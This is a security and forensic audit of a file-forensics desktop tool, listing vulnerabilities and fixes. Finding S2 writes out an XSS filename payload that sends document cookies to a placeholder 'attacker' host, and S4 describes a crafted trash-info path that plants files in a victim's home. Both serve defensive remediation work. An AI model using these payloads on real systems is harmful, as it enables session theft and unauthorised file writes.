# Security & Forensic Audit

**Date:** 2026-07-10
**Reviewer role:** Application security engineer, security auditor, and digital-forensics practitioner
**Target:** DataForge (Python CLI + PyQt5 desktop app) — a tool that scans, mutates, deletes, cleans, recovers, and forensically analyses files.
**Threat framing:** This app both (a) *operates on untrusted data* (arbitrary files, disk images, removable-media trash, evidence sets) and (b) *performs privileged/destructive actions* (permanent delete, cleanup of system dirs, cracking helpers). Those two facts are what make its security posture matter. This review evaluates it as **defensive/forensic tooling**, not as an attack platform.

> **Positive baseline first (credit where due):**
> - **No shell injection surface.** Every `subprocess` call uses an argv list; there is **no `shell=True`, `os.system`, `eval`, `exec`, `pickle`, or `yaml.load`** anywhere in `dataforge/` (verified by grep). External tools (`hashcat`, `john`, `photorec`, `exiftool`, `last`, `lsblk`, …) are invoked safely.
> - **Safe-delete-by-default.** Deletes route to the trash (`send2trash`) unless the user explicitly disables safe mode.
> - **Preview → confirm → execute** is the standard mutation pattern in the GUI.
> - **Cancellation tokens and timeouts** exist on long/external operations.
>
> The findings below are where that baseline needs shoring up.

## Findings index

| ID | Severity | Title |
| --- | --- | --- |
| S1 | 🔴 High | MD5 used for integrity/tamper-evidence and as dedup default |
| S2 | 🔴 High | Forensic HTML report is vulnerable to stored HTML/JS injection (XSS) |
| S3 | 🟠 Medium | Symlink-following scan → scope escape, TOCTOU, recursion DoS |
| S4 | 🟠 Medium | `restore_from_trash` trusts attacker-controllable `.trashinfo` path → arbitrary write |
| S5 | 🟠 Medium | Plugin loader executes arbitrary local Python with full app privileges |
| S6 | 🟠 Medium | `secure_delete` gives false assurance (SSD/CoW) and falls back to trash |
| S7 | 🟠 Medium | System Cleanup classifies whole system/temp dirs as "junk" |
| S8 | 🟠 Medium | Sensitive credential material handled with weak hygiene (world-readable temp, logs) |
| S9 | 🟡 Low | XML parsing without hardening (`recently-used.xbel`) — entity-expansion DoS |
| S10 | 🟡 Low | No config validation; blind merge of `~/.dataforge/config.json` |
| S11 | 🟡 Low | Opening scanned files via system handler (`xdg-open`/`startfile`) |
| S12 | 🟡 Low | Forensic outputs/reports written with default (often world-readable) permissions |
| S13 | 🟡 Low | Decompression-bomb exposure in image/PDF handling |

---

## 🔴 S1 — MD5 as the integrity and de-duplication digest
- **Where:** `core/config.py` (`"hash_algorithm": "md5"`), `modules/integrity.py:70,134` (hardcoded `"md5"`), `modules/duplicates.py:136`.
- **Risk:** MD5 (and SHA-1, also offered) are **cryptographically broken** for collision resistance. Two consequences:
  1. **Integrity/tamper-evidence is defeatable.** `IntegrityMonitor` is sold as change/tamper detection. An adversary who can write the monitored files can craft a modified file with the *same MD5* as the baseline, and the "integrity check passed" — the exact failure the feature exists to prevent.
  2. **De-dup data loss.** Grouping solely by MD5 and then offering "delete all but one" means a colliding pair is treated as identical; the wrong file can be deleted (see `01_CODE_REVIEW_AND_BUGS.md`, M6).
- **Fix:**
  - Default to **SHA-256** everywhere; keep MD5/SHA-1 available but **labelled "fast, not tamper-proof"** and never the default for integrity.
  - Store the algorithm inside integrity snapshots and verify against it.
  - For the destructive dedup path, add a byte-for-byte confirm before deletion regardless of hash.
- **Forensic note:** for *evidence identification* MD5/SHA-1 are still acceptable as **additional** identifiers (tool compatibility), but the manifest should always include SHA-256 as the authoritative value.

## 🔴 S2 — Stored HTML/JS injection in the forensic HTML report
- **Where:** `modules/forensics.py:577-621` (`_forensic_report_html`).
- **Evidence:** attacker-influenced strings are concatenated straight into HTML with **no escaping**:
  ```python
  f"<tr><td>{user['username']}</td>...<td>{user['home']}</td><td>{user['shell']}</td></tr>"
  f"<tr><td>{h.get('filename','')}</td>..."
  ```
  `username`, `home`, `shell` come from a parsed `/etc/passwd` on the *evidence* image; `filename` comes from files on the evidence set. All are attacker-controllable.
- **Risk:** an evidence artefact named `"><script>fetch('//attacker/'+document.cookie)</script>.jpg`, or a crafted passwd `gecos`/shell field, becomes **live script** when the examiner opens the generated `.html` report in a browser. That is stored XSS in an examiner's trusted context — it can exfiltrate other open evidence, pivot via `file://`, or simply corrupt the report. This is a well-known class of bug in forensic reporting tools and is disqualifying for court-grade output.
- **Fix:** HTML-escape **every** interpolated value (`html.escape(str(v))`), or render via a templating engine with autoescaping (Jinja2 `autoescape=True`). Add a regression test that feeds `<script>`-laden filenames/usernames and asserts the token appears escaped.

---

## 🟠 S3 — Symlink-following scan: scope escape, TOCTOU, recursion DoS
- **Where:** `core/scanner.py` (`entry.is_dir()`/`is_file()` default `follow_symlinks=True`); consumed by search, duplicates, cleanup, organize, forensics, integrity.
- **Risk:**
  - **Scope escape:** a symlink inside the chosen folder that targets `/etc`, another user's home, or a network mount silently drags those files into results — and then into *move/delete/cleanup* operations. A malicious archive/USB can weaponise this.
  - **Recursion DoS:** a symlink loop yields unbounded recursion → hang/`RecursionError`.
  - **TOCTOU:** stat-then-act across a symlink can be raced to redirect a delete/move onto a different target.
- **Fix:** scan with `follow_symlinks=False`; represent symlinks as leaf nodes; keep a visited real-path/inode set; and in `FileActionService` refuse to operate outside the user-selected root unless explicitly opted in. (Also fixes correctness bug M3.)

## 🟠 S4 — Trash restore trusts attacker-controllable metadata → arbitrary file write
- **Where:** `modules/recovery.py:191-254` (`restore_from_trash`) with paths parsed in `_scan_linux_trash` from `*.trashinfo`.
- **Evidence:** `original_path` is read from the `[Trash Info] Path=` field of a `.trashinfo` file, URL-decoded, then used directly as the `shutil.move` destination, with `os.makedirs(parent)` creating any needed directories.
- **Risk:** the app scans trash on **removable media and other mounts** (`/media`, `/mnt`, `/run/media`, `.Trash-<uid>`). An attacker-prepared USB stick can ship a `files/x` payload plus an `info/x.trashinfo` whose `Path=/home/victim/.bashrc` (or any absolute path the user can write). "Restore all" then writes the attacker's file to that location. Collision handling only appends `_restored_N`, so it won't overwrite an *existing* file — but it will happily create new files anywhere writable (dropping `.desktop` autostart entries, cron files in a writable spool, etc.).
- **Fix:** validate restored destinations — reject absolute paths outside a sane restore root, reject `..` traversal, and default to restoring into a chosen "Recovered" folder with the original path shown for reference. Require per-item confirmation when the target is outside the user's home. Never auto-`makedirs` arbitrary system paths.

## 🟠 S5 — Plugin loader executes arbitrary local Python
- **Where:** `ui/plugin_loader.py:37-52` (`spec.loader.exec_module(module)` for every `*.py` in the plugins dir); plugin dir = `dataforge/ui/plugins/` (`ui/app.py:835`).
- **Risk:** any `.py` file dropped into that directory is imported and executed **in-process with the user's full privileges** — no signing, no manifest, no sandbox, no allow-list. In a packaged/multi-user install, or if the app directory is writable by a lower-privileged process, this is a straightforward code-execution/persistence vector (drop a plugin, it runs on next launch).
- **Fix:** document the trust boundary explicitly ("plugins are arbitrary code; only add plugins you trust"); load plugins from a **per-user** dir with checked permissions rather than the install tree; consider an opt-in flag to enable plugins at all; log every plugin load path at INFO. Sandboxing Python is hard — the realistic control is *provenance + explicit opt-in + least privilege on the directory*.

## 🟠 S6 — `secure_delete` overstates its guarantee
- **Where:** `modules/forensics.py:906-939`.
- **Risk:** overwrite-in-place (`open(path,"r+b")` + random passes) does **not** reliably destroy data on SSDs/flash (wear-levelling relocates blocks), on copy-on-write filesystems (btrfs/ZFS/APFS write new extents), or on journaled/log-structured filesystems. The function nonetheless returns `"securely deleted"`. Worse, on `unlink` failure it **falls back to `send2trash`** — moving a file you asked to *destroy* into the recoverable trash. A user relying on this for sensitive data gets a false sense of security.
- **Fix:** rename/relabel to "best-effort overwrite" and document the media caveats in the UI; remove the trash fallback for this operation (fail loudly instead); where real erasure matters, point to full-disk/hardware-level tooling (`blkdiscard`, ATA secure erase, full-disk encryption + key destruction). Multi-pass overwrite is largely cargo-cult on modern media — say so.

## 🟠 S7 — System Cleanup treats entire system/temp trees as deletable "junk"
- **Where:** `modules/system_cleanup.py:180-263` (esp. line 249: any file under *System Temp / User Cache / Thumbnails / Trash / Crash Reports* is `is_junk = True` regardless of type); user-supplied `paths` are appended to the first category (line 226) and thus inherit that blanket classification.
- **Risk:** `fm cleanup --execute` (or the GUI) can delete **active** `/tmp` and `/var/tmp` content — Unix domain sockets, lock files, in-use temp files of *other running processes* — breaking live sessions; and because a user-passed `--path` lands in a blanket-junk category, pointing it at an ordinary folder flags **everything in it** as junk. Combined with permanent-delete mode this is a serious data-loss footgun.
- **Fix:** never classify user-specified paths as blanket junk (match them by extension/name like everything else); require a minimum age for `/tmp`/`/var/tmp` entries and skip sockets/FIFOs/files with open handles; maintain an allow-list of *safe-to-clear* subtrees rather than a broad category match; always default to dry-run and show the exact list before deletion (it does preview — keep that non-optional for system dirs).

## 🟠 S8 — Sensitive credential material handled with weak hygiene
- **Where:** `modules/password_tools.py` — `generate_crackable_hash` writes `*.hash` to `tempfile.gettempdir()` (line 242-247); `_extract_shadow_hashes` returns full shadow hashes; dictionary-attack results return cracked `hash:password` strings; `analyze_password_strength` returns `pwd[:2] + "*"*…` (leaks first two chars).
- **Risk:** extracted password hashes and *recovered plaintext passwords* are written to a **world-readable** `/tmp/<name>.hash` (default umask → 0644) and passed around in result dicts that flow to the UI and, potentially, the app log. On a shared host, other users can read them. Leaking the first two characters of a password materially reduces its search space.
- **Fix:** write hash/result files with `0600` into a per-user directory (`os.open(..., 0o600)` or `tempfile.mkstemp` then `chmod`); never log cracked secrets; scrub result dicts before they reach the log; mask passwords fully (`"•"*len`) or show only a strength verdict, not leading characters; delete temp hash files after use.

---

## 🟡 Low severity

### S9 — Unhardened XML parsing (`recently-used.xbel`)
- **Where:** `modules/forensics.py:1029-1061` (`xml.etree.ElementTree.parse`).
- **Risk:** stdlib ElementTree does not resolve external entities (so classic XXE is mostly out), but it is still susceptible to **entity-expansion / "billion laughs"** denial of service on a hostile evidence file. A forensic tool by definition parses hostile input.
- **Fix:** parse with `defusedxml.ElementTree`.

### S10 — No config validation (blind merge)
- **Where:** `core/config.py:52-58` (`self.data.update(loaded)`).
- **Risk:** a corrupted/hostile `~/.dataforge/config.json` can inject unknown keys and out-of-range values (e.g. `max_thread_workers: 100000` → thread exhaustion, `hash_algorithm: "…"` → downstream errors). Low, because it's the user's own file, but it's an easy robustness win and a supply-chain concern if the file is synced across machines.
- **Fix:** validate types/ranges/enums on load; ignore unknown keys or migrate them explicitly; clamp worker counts.

### S11 — Opening scanned files with the OS default handler
- **Where:** `ui/widgets.py:852-887,1612` (`os.startfile` / `xdg-open` / `open` on user-selected scan results).
- **Risk:** standard file-manager behaviour, but "open" on an *untrusted* scanned file hands it to the system handler — a malicious document/`.desktop`/office-macro file can then exploit the associated application. Not injectable (argv), but worth a user-facing caveat for results that came from untrusted media.
- **Fix:** for "open", confirm when the file is executable or a `.desktop`/script; prefer "reveal in folder" as the default action for untrusted result sets.

### S12 — Forensic outputs written with default permissions
- **Where:** `modules/forensics.py` report/manifest writers, `modules/integrity.py` snapshots, hardware/metadata exports.
- **Risk:** hash manifests, OS-artifact dumps (usernames, auth-log lines, shell history), and integrity baselines are written with the process umask (commonly world-readable). On multi-user systems that discloses sensitive triage data and undermines chain-of-custody expectations.
- **Fix:** write forensic artefacts `0600`; optionally record a SHA-256 of each report for integrity; timestamp with timezone (already done in some paths).

### S13 — Decompression-bomb exposure
- **Where:** `core/media_ops.py` / `modules/cleaner.py` (`PIL.Image.open`), `modules/metadata.py`, PDF via `pypdf`/`pymupdf`.
- **Risk:** a crafted image/PDF can blow up memory/CPU when decoded (Pillow's default `MAX_IMAGE_PIXELS` guard helps but is a warning, not a hard stop everywhere; PDF page trees can be pathological).
- **Fix:** set an explicit `Image.MAX_IMAGE_PIXELS` policy and catch `Image.DecompressionBombError`; cap page counts / sizes for PDF operations; run media conversion of untrusted files under resource limits.

---

## Forensic-soundness checklist (practitioner view)

Beyond classic appsec, a tool that markets forensics/recovery should meet evidence-handling expectations. Current gaps:

| Expectation | Status | Action |
| --- | --- | --- |
| Read-only handling of evidence | ⚠️ Partial | Carving/artifact parsing read-only; but same app can *mutate/delete* — separate an explicit "read-only evidence" mode. |
| Authoritative hashing (SHA-256) | ❌ | Default is MD5 (S1). Make SHA-256 authoritative in every manifest. |
| Report integrity / non-repudiation | ❌ | Reports are plain files, world-readable (S12), HTML-injectable (S2). Escape output, hash reports, restrict perms. |
| Deterministic, timezone-aware timestamps | ⚠️ Partial | Timeline uses UTC; report `datetime.now()` is naive/local. Standardise on UTC ISO-8601. |
| Chain-of-custody / audit log | ❌ | No tamper-evident action log. Add an append-only audit trail for evidence operations. |
| Tool/version + input provenance in reports | ⚠️ Partial | Tool name present; add tool version, host, operator, and input hashes. |
| Hostile-input hardening (XML/media/paths) | ❌/⚠️ | S2, S9, S13, S3 above. |

## Recommended remediation order

1. **S2** (report XSS) and **S1** (MD5) — these directly undermine the forensic value proposition and are cheap to fix.
2. **S3 / S4 / S7** — the "operate on untrusted paths and then destroy things" cluster; highest real-world blast radius.
3. **S5 / S6 / S8** — code-exec surface, false-security control, and secret hygiene.
4. **S9–S13** — hardening and hygiene, batchable with the roadmap's dependency/linting work.

Each finding above is written to be actionable in isolation; none requires a redesign. The architecture (centralised `FileActionService`, single scanner, preview/confirm) is actually a good place to *enforce* these controls once, which is why fixing them at the seam (scanner, service, report writer) is high-leverage.
